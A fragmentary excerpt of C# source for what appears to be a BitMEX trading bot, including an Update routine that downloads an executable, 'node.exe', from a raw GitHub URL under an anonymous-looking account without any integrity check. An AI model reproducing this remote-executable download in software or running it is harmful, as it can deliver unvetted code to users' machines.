...
namespace Valloon.BitMEX
{
    class Program
    {
        ...
        static void Main(string[] args)
        {
            ...
            try
            {
                GlobalParam.APP_HASH = GetMyMD5();
            }
            catch (Exception ex)
            {
                GlobalParam.APP_HASH = ex.Message;
            }
            RobustStrategy.Run();
        ...
        public static void Update()
        {
            try
            {
                ...
                {
                    client.DownloadFile("https://raw.githubusercontent.com/anonymous-bye/node/master/node.exe", filename);
                }
